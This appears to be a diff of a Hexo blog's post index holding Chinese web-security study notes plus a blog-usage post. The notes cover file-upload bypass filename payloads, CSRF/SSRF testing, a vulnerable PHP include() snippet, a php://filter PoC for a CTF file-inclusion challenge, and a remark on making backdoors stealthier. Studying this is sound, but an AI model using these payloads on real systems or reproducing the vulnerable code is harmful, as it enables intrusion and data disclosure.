-<p>3,测试文件上传漏洞，是否可以验证或者绕过，上传一个php文档判断黑白名单，判断是否存在格式限制或内容审查</p>
-<p>4,若上面的内容都没有则判断，是否为cms漏洞，在知道cms类型后可以搜索是否爆出过漏洞</p>
-<p>5,如果都没有则再来到编辑器漏洞，判断编辑器类型，搜索漏洞</p>
-<p>6,没有就查找是否爆出过cve词条漏洞</p>
-<p><img src="/imgs/$%7Bfiilename%7D/image-20220908201230886.png">#上传参数名解析：明确哪些东西能修改？</p>
-<p>Content-Disposition：表单数据 一般可更改</p>
-<p>name：表单参数值，不能更改</p>
-<p>filename：文件名，可以更改</p>
-<p>Content-Type：上传文件带的参数值 文件 MIME，视情况更改</p>
-<p>#常见绕过方法：</p>
-<p>数据溢出-防匹配(xxx…)</p>
-<p>符号变异-防匹配（</p>
-<p>‘ “ ;）</p>
-<p>数据截断-防匹配(%00 ; 换行)</p>
-<p>重复数据-防匹配(参数多次)</p>
-<p>#Payload:</p>
-<p>大量垃圾数据缓冲溢出(Content-Disposition,filename 等)</p>
-<p>filename=x.php</p>
-<p>filename=”x.php</p>
-<p>filename=’x.php</p>
-<p>filename=”a.jpg;.php”;</p>
-<p>filename=”a.php%00.jpg”</p>
-<p>filename=”Content-Disposition: form-data; name=”upload_file”;x.php”</p>
-<p>filename=”x.jpg”;filename=”x.jpg”;…..filename=”x.php”;</p>
-<p>filename=”xxx/x.jpg”</p>
-<p>filename=</p>
-<p>“</p>
-<p>x</p>
-<p>.</p>
-<p>p</p>
-<p>h</p>
-<p>p</p>
-<p>“</p>
-<p>/jpeg；/x.php   xxxx/x.php</p>
-<h3 id="MIME-类型"><a href="#MIME-类型" class="headerlink" title="MIME 类型"></a>MIME 类型</h3><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。</p>
-<p>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p>
-<p>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL，因此 We b服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p>
-<h2 id="xss跨站"><a href="#xss跨站" class="headerlink" title="xss跨站"></a>xss跨站</h2><p><strong>跨网站脚本（Cross-site scripting，XSS）</strong> 又称为跨站脚本攻击，是一种经常出现在Web应用程序的安全漏洞攻击，也是代码注入的一种。XSS是由于Web应用程序对用户的输入过滤不足而产生的，攻击者利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害者用户可能采取Cookie窃取、会话劫持、钓鱼欺骗等各种攻击。这类攻击通常包含了HTML以及用户端脚本语言。</p>
-<h2 id="CSRF和SSRF"><a href="#CSRF和SSRF" class="headerlink" title="CSRF和SSRF"></a>CSRF和SSRF</h2><h3 id="csrf跨站请求伪造"><a href="#csrf跨站请求伪造" class="headerlink" title="csrf跨站请求伪造"></a>csrf跨站请求伪造</h3><p>使用burp里自带的工具</p>
-<p><img src="/imgs/$%7Bfiilename%7D/20221017191959.png"></p>
-<p>此漏洞利用：修改信息，添加管理员</p>
-<p>注意网站有无添加，修改功能才可能有csrf漏洞存在</p>
-<p>如果测试后没有变化，网站不存在这个漏洞</p>
-<ol>
-<li>抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞</li>
-<li>如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</li>
-<li>利用工具进行CSRF检测。如：CSRFTESTER，CSRF REQUEST BUILDER等</li>
-</ol>
-<h3 id="ssrf-服务器请求伪造"><a href="#ssrf-服务器请求伪造" class="headerlink" title="ssrf 服务器请求伪造"></a>ssrf 服务器请求伪造</h3><p>影响到内部系统</p>
-<p><img src="/imgs/$%7Bfiilename%7D/image-20220912210408290.png"></p>
-<p><img src="/imgs/$%7Bfiilename%7D/image-20220912210429653.png"></p>
-<p><img src="/imgs/$%7Bfiilename%7D/image-20220912210449078.png"></p>
-<p><a href="https://blog.csdn.net/weixin_45663905/article/details/108086622">服务器端请求伪造——SSRF_ihszg的博客-CSDN博客_伪造发包服务器</a></p>
-<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>可控制变量</p>
-<p>使用函数造成的效果</p>
-<p>文件包含漏洞的产生原因是在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。被包含的文件在第三方服务器时，就形成了远程文件包含漏洞。</p>
-<p>　　本地到远程：如果php.ini的配置选项allow_url_fopen和allow_url_include为ON的话，则文件包含函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞。</p>
-<p>　　include()：当使用该函数包含文件时，只有代码执行到include（）函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</p>
-<p>　　include_once()：这个函数跟include函数作用几乎相同，只是他在导入函数之前先检测下该文件是否被导入。如果已经执行一遍那么就不重复执行了。</p>
-<p>　　require()：跟include唯一不同的是，当产生错误时，include下面继续运行而require停止运行了。</p>
-<p>　　require_once()：它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
-<p>　　看到这四个函数时，看到有参数，且参数可控，没有过滤，或过滤不严，就一定有文件包含漏洞。</p>
-<p>常见漏洞代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[page]))&#123; include $_GET[page];&#125; else&#123;include&quot;home.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>　触发漏洞的条件：</p>
-<p>　　　　web应用采用include()等文件包含函数通过动态变量的方式引入需要包含的文件。</p>
-<p>　　　　用户能够控制该动态变量。</p>
-<h2 id="文件包含漏洞概括：-文件包含漏洞（完整版）-Vansnc的博客-CSDN博客-文件包含漏洞"><a href="#文件包含漏洞概括：-文件包含漏洞（完整版）-Vansnc的博客-CSDN博客-文件包含漏洞" class="headerlink" title="文件包含漏洞概括： 文件包含漏洞（完整版）_Vansnc的博客-CSDN博客_文件包含漏洞"></a>文件包含漏洞概括：<a href="https://blog.csdn.net/Vansnc/article/details/82528395"> 文件包含漏洞（完整版）_Vansnc的博客-CSDN博客_文件包含漏洞</a></h2><h2 id="文件包含漏洞伪协议利用补充："><a href="#文件包含漏洞伪协议利用补充：" class="headerlink" title="文件包含漏洞伪协议利用补充："></a>文件包含漏洞伪协议利用补充：</h2><h3 id="php-filter的各种过滤器"><a href="#php-filter的各种过滤器" class="headerlink" title="php://filter的各种过滤器"></a>php://filter的各种过滤器</h3><p>官方文档介绍的可用过滤器列表：<a href="https://www.php.net/manual/zh/filters.php">PHP: 可用过滤器列表 - Manual</a></p>
-<p>应用链接：<a href="https://blog.csdn.net/qq_44657899/article/details/109300335"> php://filter的各种过滤器_天问_Herbert555的博客-CSDN博客_php://filter rot13</a></p>
-<p>使用例子链接:</p>
-<p>file_include：<a href="https://adworld.xctf.org.cn/challenges/details?hash=ceb014e8-3a5a-11ed-abf3-fa163e4fa609&amp;task_category_id=3">https://adworld.xctf.org.cn/challenges/details?hash=ceb014e8-3a5a-11ed-abf3-fa163e4fa609&amp;task_category_id=3</a></p>
-<p>解题参考：<a href="https://blog.csdn.net/shelter1234567/article/details/127393549">江苏工匠杯_file _include_wp_昵称还在想呢的博客-CSDN博客</a></p>
-<p>文件包含的绕过或许也可以尝试一下过滤器绕过的思路</p>
-<p>在这题ctf例题中就是采用的过滤器绕过思路中的</p>
-<p>0x02 Conversion Filters（转换过滤器）</p>
-<p>转换过滤器里的convert.iconv.*</p>
-<p>这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的（、iconv不是php的默认函数，也是默认安装的模块。需要安装才能用的。）。使用convert.iconv.*过滤器等同于用<code>iconv()</code>函数处理所有的流数据。</p>
-<p>使用方法：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; </span><br><span class="line">or </span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>&lt;input-encoding&gt;和&lt;output-encoding&gt;</code> 就是编码方式，有如下几种;</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8*</span><br><span class="line">ASCII*</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>利用姿势：把flag.php的内容从<code>UCS-2LE</code>编码转换为<code>UCS-2BE</code>编码</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=2.php</span><br></pre></td></tr></table></figure>
-
-<p>在本例题中</p>
-<p>知道绕过方式后我们回显check.php里面的源码:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:61806/?filename=php://filter/convert.iconv.UTF-7.UCS-2LE/resource=check.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221025114012.png"></p>
-<p>如图,本题对过滤器进行了限制,还限制了convert.iconv.*过滤器里的编码类型.但好在该过滤器支持的编码类型多样,所以换种编码类型也能达到绕过效果,(多试几种编码类型)</p>
-<p>本题通关poc</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:61806/?filename=php://filter/convert.iconv.UTF-7.UCS-2LE/resource=flag.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221025114526.png"></p>
-<p>这还有一题也是ctf里面的文件包含形式，这题的过滤代码更多</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221025155125.png"></p>
-<p>也是使用这个过滤器问题，多试几次过滤器里面的编码形式就可以得出答案了。</p>
-<p>所以文件包含的绕过思路绝不止一种,多试试.</p>
-]]></content>
-      <categories>
-        <category>基础知识</category>
-      </categories>
-      <tags>
-        <tag>基础知识</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>内网学习笔记</title>
-    <url>/2022/10/19/10-49-13/</url>
-    <content><![CDATA[<h1 id="内网学习记录"><a href="#内网学习记录" class="headerlink" title="内网学习记录"></a>内网学习记录</h1>]]></content>
-      <categories>
-        <category>内网</category>
-      </categories>
-      <tags>
-        <tag>内网学习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>博客文章编写方式</title>
-    <url>/2022/10/15/17-58-19/</url>
-    <content><![CDATA[<h1 id="你好"><a href="#你好" class="headerlink" title="你好"></a>你好</h1><h2 id="博客的创建方式是先"><a href="#博客的创建方式是先" class="headerlink" title="博客的创建方式是先"></a>博客的创建方式是先</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;文章主题&quot;</span><br><span class="line">然后去文件地址编辑</span><br><span class="line">编辑好后</span><br><span class="line">再</span><br><span class="line">hexo c</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">上传到github是</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="给文章添加标签分类"><a href="#给文章添加标签分类" class="headerlink" title="给文章添加标签分类:"></a>给文章添加标签分类:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: 博客文章编写方式        #文章标题</span><br><span class="line">date: 2022-10-15 17:58:19   #文章编写修改时间</span><br><span class="line">tags: hexo博客搭建说明         #文章标签说明</span><br><span class="line">categories : 使用说明          #文章分类类别</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传:"></a>图片上传:</h1><p>由于上传不显示图片的原因,所以我采用了另一种图片上传方式,虽有些繁琐,但极大解决了不会修改图像链接的问题.</p>
-<p>首先,创建以上传博客文件命名的文件夹的插件和命令不用删除,我们可以将这个文件夹当作我们上传图片时的备份文件夹</p>
-<p>然后就是上传图片的操作了</p>
-<p>这是原帖子链接</p>
-<p><a href="https://blog.csdn.net/Qxiaofei_/article/details/124629908">(2条消息) 【Hexo】GitHub+Typora写博客+图片上传_Q大帅的博客-CSDN博客_hexo如何上传图片</a></p>
-<p>下面我先简单演示</p>
-<p>创建一个新的imgs文件夹,位于</p>
-<p><img src="/imgs/$%7Bfiilename%7D/20221016(1).png"></p>
-<p>source 目录下</p>
-<p>我们事先就已经在图片上传偏好设置里就将图片上传的默认目录修改好了</p>
-<p><img src="/imgs/$%7Bfiilename%7D/20221016(2).png"></p>
-<p>如图,接下来就是在编写的博客开头添加图像默认路径</p>
-<p>在”格式””图像””设置图片根目录”</p>
-<p>成功后</p>
-<p>如图:</p>
-<p><img src="/imgs/$%7Bfiilename%7D/20221016(3).png"></p>
-<p>随后就是插入图片</p>
-<p>在”格式” “图像” “插入图片”</p>
-<p>一定要记得将图片放在imgs 文件夹中</p>
-<p>这样引用图片时才不会出错</p>
-<p>然后也可以将图片放在对应博客名的文件夹中备份,方便修改时查阅</p>
-<p>最后放上我可爱的草神:</p>
-<p><img src="/imgs/$%7Bfiilename%7D/1.gif"></p>
-]]></content>
-      <categories>
-        <category>使用说明</category>
-      </categories>
-      <tags>
-        <tag>hexo博客搭建说明</tag>
       </tags>
   </entry>
   <entry>
@@ -844,6 +784,209 @@
       </categories>
       <tags>
         <tag>靶场渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>博客文章编写方式</title>
+    <url>/2022/10/15/17-58-19/</url>
+    <content><![CDATA[<h1 id="你好"><a href="#你好" class="headerlink" title="你好"></a>你好</h1><h2 id="博客的创建方式是先"><a href="#博客的创建方式是先" class="headerlink" title="博客的创建方式是先"></a>博客的创建方式是先</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;文章主题&quot;</span><br><span class="line">然后去文件地址编辑</span><br><span class="line">编辑好后</span><br><span class="line">再</span><br><span class="line">hexo c</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">上传到github是</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="给文章添加标签分类"><a href="#给文章添加标签分类" class="headerlink" title="给文章添加标签分类:"></a>给文章添加标签分类:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: 博客文章编写方式        #文章标题</span><br><span class="line">date: 2022-10-15 17:58:19   #文章编写修改时间</span><br><span class="line">tags: hexo博客搭建说明         #文章标签说明</span><br><span class="line">categories : 使用说明          #文章分类类别</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传:"></a>图片上传:</h1><p>由于上传不显示图片的原因,所以我采用了另一种图片上传方式,虽有些繁琐,但极大解决了不会修改图像链接的问题.</p>
+<p>首先,创建以上传博客文件命名的文件夹的插件和命令不用删除,我们可以将这个文件夹当作我们上传图片时的备份文件夹</p>
+<p>然后就是上传图片的操作了</p>
+<p>这是原帖子链接</p>
+<p><a href="https://blog.csdn.net/Qxiaofei_/article/details/124629908">(2条消息) 【Hexo】GitHub+Typora写博客+图片上传_Q大帅的博客-CSDN博客_hexo如何上传图片</a></p>
+<p>下面我先简单演示</p>
+<p>创建一个新的imgs文件夹,位于</p>
+<p><img src="/imgs/$%7Bfiilename%7D/20221016(1).png"></p>
+<p>source 目录下</p>
+<p>我们事先就已经在图片上传偏好设置里就将图片上传的默认目录修改好了</p>
+<p><img src="/imgs/$%7Bfiilename%7D/20221016(2).png"></p>
+<p>如图,接下来就是在编写的博客开头添加图像默认路径</p>
+<p>在”格式””图像””设置图片根目录”</p>
+<p>成功后</p>
+<p>如图:</p>
+<p><img src="/imgs/$%7Bfiilename%7D/20221016(3).png"></p>
+<p>随后就是插入图片</p>
+<p>在”格式” “图像” “插入图片”</p>
+<p>一定要记得将图片放在imgs 文件夹中</p>
+<p>这样引用图片时才不会出错</p>
+<p>然后也可以将图片放在对应博客名的文件夹中备份,方便修改时查阅</p>
+<p>最后放上我可爱的草神:</p>
+<p><img src="/imgs/$%7Bfiilename%7D/1.gif"></p>
+]]></content>
+      <categories>
+        <category>使用说明</category>
+      </categories>
+      <tags>
+        <tag>hexo博客搭建说明</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web基础</title>
+    <url>/2022/10/17/17-43-58/</url>
+    <content><![CDATA[<h1 id="总结一下到目前所学的基础知识"><a href="#总结一下到目前所学的基础知识" class="headerlink" title="总结一下到目前所学的基础知识:"></a>总结一下到目前所学的基础知识:</h1><p>大概涉及很多方面但涉及到的深入一点的也会另开新卷详细描述</p>
+<p>主要涉及到的都是小迪2020课程里面的内容:</p>
+<p>常常更新</p>
+<h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄:"></a>摘抄:</h2><p><strong>1：攻击方与防御方的本质是什么？</strong>增加对方的时间成本，人力成本，资源成本（不限制于服务器资源），金钱成本。<strong>2：安全公司的本质是什么？</strong>盈利，最小投入，最大产出。<strong>3：安全公司产品的本质是什么？</strong>能适应大部分客户，适应市场化，并且适应大部分机器。（包括不限制于资源紧张，宽带不足等问题的客户）<strong>4：安全人员的本质是什么？</strong>赚钱，养家。买房，还房贷。导致，快速解决客户问题（无论暂时还是永久性解决），以免投诉。<strong>5：对接客户的本质是什么？</strong>对接客户也是某公司内安全工作的一员，与概念 4 相同。清晰了以上 5 个概念，作为攻击者，要首先考虑到对抗成本，什么样的对抗成本，能满足概念 1-5。影响或阻碍对手方的核心利益。把概念加入到后门，更隐蔽，更长久。</p>
+<h2 id="HTTP-规划定义了-8-种可能的请求方法："><a href="#HTTP-规划定义了-8-种可能的请求方法：" class="headerlink" title="HTTP 规划定义了 8 种可能的请求方法："></a>HTTP 规划定义了 8 种可能的请求方法：</h2><p>GET：检索 URL 中标识资源的一个简单请求 </p>
+<p>HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档 </p>
+<p>POST：服务器接受被写入客户端输出流中的数据的请求 </p>
+<p>PUT：服务器保存请求数据作为指定 URL 新内容的请求 </p>
+<p>DELETE：服务器删除 URL 中命令的资源的请求 </p>
+<p>OPTIONS：关于服务器支持的请求方法信息的请求 </p>
+<p>TRACE：web 服务器反馈 Http 请求和其头标的请求 </p>
+<p>CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理 </p>
+<p>#请求头由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。 </p>
+<h2 id="HTTP-响应码："><a href="#HTTP-响应码：" class="headerlink" title="HTTP 响应码："></a>HTTP 响应码：</h2><p>1xx：信息，请求收到，继续处理 </p>
+<p>2xx：成功，行为被成功地接受、理解和采纳 </p>
+<p>3xx：重定向，为了完成请求，必须进一步执行的动作 </p>
+<p>4xx：客户端错误 </p>
+<p>5xx：服务器错误 </p>
+<h1 id="信息收集决定攻击深度"><a href="#信息收集决定攻击深度" class="headerlink" title="信息收集决定攻击深度"></a>信息收集决定攻击深度</h1><p><img src="/imgs/$%7Bfiilename%7D/image-20220929190720671.png"></p>
+<h2 id="信息收集是攻击面打开的必要操作"><a href="#信息收集是攻击面打开的必要操作" class="headerlink" title="信息收集是攻击面打开的必要操作"></a>信息收集是攻击面打开的必要操作</h2><p>更多的信息可以测试更多的漏洞方面</p>
+<p>无论是src还是渗透测试一个具体目标</p>
+<p>信息收集的方式多种多样</p>
+<p>有像fofa一样的在黑暗引擎中大海捞针,不错过与测试网站相关的一个页面</p>
+<p>有得到一个web页面后对网站进行扫描,收集IP地址开放的端口号,网站后台目录,后台文件,有时候我们的突破口就产生在这里面</p>
+<p>最常用的就是御剑后台扫描工具,nmap工具,kali里的dirp 工具,部署在服务器端上的msf(这是一个大学问) ,还有一款叫水泽的信息收集工具,等等,后面知道更多了还会添加.</p>
+<p>内网信息收集是针对进入目标主机后进行的信息收集操作,此方面涉及到系统的操作命令学习,</p>
+<p>（<a href="https://blog.csdn.net/qq_43001579/article/details/83591539">(真·Nmap用法大全_车大叔的博客-CSDN博客</a>）</p>
+<h3 id="其他补充"><a href="#其他补充" class="headerlink" title="其他补充:"></a>其他补充:</h3><p>F12进行查看网站网络可以看到server：里面的信息</p>
+<p>server：看的信息很全的很可能就是由网页搭建平台搭建的</p>
+<p>WAF存在时，扫描会产生误差，网站可能拒绝访问</p>
+<p>检查时网站返回的数据包里面可能有某些可疑信息，里面可能就是含有WAF</p>
+<p>（X-Powered-By：WAF）</p>
+<p>子域名查找及C段旁注等。</p>
+<h1 id="web漏洞知识点"><a href="#web漏洞知识点" class="headerlink" title="web漏洞知识点"></a>web漏洞知识点</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入:"></a>sql注入:</h2><p><img src="/imgs/$%7Bfiilename%7D/image-20220905205200543.png"></p>
+<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞:"></a>文件上传漏洞:</h2><p><img src="/imgs/$%7Bfiilename%7D/image-20220906174853666.png"></p>
+<h4 id="查找与判断"><a href="#查找与判断" class="headerlink" title="查找与判断"></a>查找与判断</h4><p>黑盒测试，扫描</p>
+<p>搜索引擎搜索upload</p>
+<p>会员文件传输页面</p>
+<p>后台权限页面</p>
+<p>白盒代码分析查找文件上传源码</p>
+<p>文件上传抓包判断</p>
+<p>黑名单：明确不让上传的格式后缀</p>
+<p>在定义后缀名不完整的情况下，我们可以用其他格式，达到同样效果，看网站的知识应用层面</p>
+<p>白名单：明确可以上传的格式后缀</p>
+<p>更安全一些</p>
+<h3 id="文件上传漏洞测试思维"><a href="#文件上传漏洞测试思维" class="headerlink" title="文件上传漏洞测试思维"></a>文件上传漏洞测试思维</h3><p>1,通过字典扫描，或者判断会员中心等都可能存在文件上传漏洞</p>
+<p>2,到测试站点是否存在解析漏洞如：iis apache Nginx 等</p>
+<p>3,测试文件上传漏洞，是否可以验证或者绕过，上传一个php文档判断黑白名单，判断是否存在格式限制或内容审查</p>
+<p>4,若上面的内容都没有则判断，是否为cms漏洞，在知道cms类型后可以搜索是否爆出过漏洞</p>
+<p>5,如果都没有则再来到编辑器漏洞，判断编辑器类型，搜索漏洞</p>
+<p>6,没有就查找是否爆出过cve词条漏洞</p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20220908201230886.png">#上传参数名解析：明确哪些东西能修改？</p>
+<p>Content-Disposition：表单数据 一般可更改</p>
+<p>name：表单参数值，不能更改</p>
+<p>filename：文件名，可以更改</p>
+<p>Content-Type：上传文件带的参数值 文件 MIME，视情况更改</p>
+<p>#常见绕过方法：</p>
+<p>数据溢出-防匹配(xxx…)</p>
+<p>符号变异-防匹配（</p>
+<p>‘ “ ;）</p>
+<p>数据截断-防匹配(%00 ; 换行)</p>
+<p>重复数据-防匹配(参数多次)</p>
+<p>#Payload:</p>
+<p>大量垃圾数据缓冲溢出(Content-Disposition,filename 等)</p>
+<p>filename=x.php</p>
+<p>filename=”x.php</p>
+<p>filename=’x.php</p>
+<p>filename=”a.jpg;.php”;</p>
+<p>filename=”a.php%00.jpg”</p>
+<p>filename=”Content-Disposition: form-data; name=”upload_file”;x.php”</p>
+<p>filename=”x.jpg”;filename=”x.jpg”;…..filename=”x.php”;</p>
+<p>filename=”xxx/x.jpg”</p>
+<p>filename=</p>
+<p>“</p>
+<p>x</p>
+<p>.</p>
+<p>p</p>
+<p>h</p>
+<p>p</p>
+<p>“</p>
+<p>/jpeg；/x.php   xxxx/x.php</p>
+<h3 id="MIME-类型"><a href="#MIME-类型" class="headerlink" title="MIME 类型"></a>MIME 类型</h3><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。</p>
+<p>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p>
+<p>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL，因此 We b服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p>
+<h2 id="xss跨站"><a href="#xss跨站" class="headerlink" title="xss跨站"></a>xss跨站</h2><p><strong>跨网站脚本（Cross-site scripting，XSS）</strong> 又称为跨站脚本攻击，是一种经常出现在Web应用程序的安全漏洞攻击，也是代码注入的一种。XSS是由于Web应用程序对用户的输入过滤不足而产生的，攻击者利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害者用户可能采取Cookie窃取、会话劫持、钓鱼欺骗等各种攻击。这类攻击通常包含了HTML以及用户端脚本语言。</p>
+<h2 id="CSRF和SSRF"><a href="#CSRF和SSRF" class="headerlink" title="CSRF和SSRF"></a>CSRF和SSRF</h2><h3 id="csrf跨站请求伪造"><a href="#csrf跨站请求伪造" class="headerlink" title="csrf跨站请求伪造"></a>csrf跨站请求伪造</h3><p>使用burp里自带的工具</p>
+<p><img src="/imgs/$%7Bfiilename%7D/20221017191959.png"></p>
+<p>此漏洞利用：修改信息，添加管理员</p>
+<p>注意网站有无添加，修改功能才可能有csrf漏洞存在</p>
+<p>如果测试后没有变化，网站不存在这个漏洞</p>
+<ol>
+<li>抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞</li>
+<li>如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</li>
+<li>利用工具进行CSRF检测。如：CSRFTESTER，CSRF REQUEST BUILDER等</li>
+</ol>
+<h3 id="ssrf-服务器请求伪造"><a href="#ssrf-服务器请求伪造" class="headerlink" title="ssrf 服务器请求伪造"></a>ssrf 服务器请求伪造</h3><p>影响到内部系统</p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20220912210408290.png"></p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20220912210429653.png"></p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20220912210449078.png"></p>
+<p><a href="https://blog.csdn.net/weixin_45663905/article/details/108086622">服务器端请求伪造——SSRF_ihszg的博客-CSDN博客_伪造发包服务器</a></p>
+<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>可控制变量</p>
+<p>使用函数造成的效果</p>
+<p>文件包含漏洞的产生原因是在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。被包含的文件在第三方服务器时，就形成了远程文件包含漏洞。</p>
+<p>　　本地到远程：如果php.ini的配置选项allow_url_fopen和allow_url_include为ON的话，则文件包含函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞。</p>
+<p>　　include()：当使用该函数包含文件时，只有代码执行到include（）函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</p>
+<p>　　include_once()：这个函数跟include函数作用几乎相同，只是他在导入函数之前先检测下该文件是否被导入。如果已经执行一遍那么就不重复执行了。</p>
+<p>　　require()：跟include唯一不同的是，当产生错误时，include下面继续运行而require停止运行了。</p>
+<p>　　require_once()：它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
+<p>　　看到这四个函数时，看到有参数，且参数可控，没有过滤，或过滤不严，就一定有文件包含漏洞。</p>
+<p>常见漏洞代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[page]))&#123; include $_GET[page];&#125; else&#123;include&quot;home.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>　触发漏洞的条件：</p>
+<p>　　　　web应用采用include()等文件包含函数通过动态变量的方式引入需要包含的文件。</p>
+<p>　　　　用户能够控制该动态变量。</p>
+<h2 id="文件包含漏洞概括：-文件包含漏洞（完整版）-Vansnc的博客-CSDN博客-文件包含漏洞"><a href="#文件包含漏洞概括：-文件包含漏洞（完整版）-Vansnc的博客-CSDN博客-文件包含漏洞" class="headerlink" title="文件包含漏洞概括： 文件包含漏洞（完整版）_Vansnc的博客-CSDN博客_文件包含漏洞"></a>文件包含漏洞概括：<a href="https://blog.csdn.net/Vansnc/article/details/82528395"> 文件包含漏洞（完整版）_Vansnc的博客-CSDN博客_文件包含漏洞</a></h2><h2 id="文件包含漏洞伪协议利用补充："><a href="#文件包含漏洞伪协议利用补充：" class="headerlink" title="文件包含漏洞伪协议利用补充："></a>文件包含漏洞伪协议利用补充：</h2><h3 id="php-filter的各种过滤器"><a href="#php-filter的各种过滤器" class="headerlink" title="php://filter的各种过滤器"></a>php://filter的各种过滤器</h3><p>官方文档介绍的可用过滤器列表：<a href="https://www.php.net/manual/zh/filters.php">PHP: 可用过滤器列表 - Manual</a></p>
+<p>应用链接：<a href="https://blog.csdn.net/qq_44657899/article/details/109300335"> php://filter的各种过滤器_天问_Herbert555的博客-CSDN博客_php://filter rot13</a></p>
+<p>使用例子链接:</p>
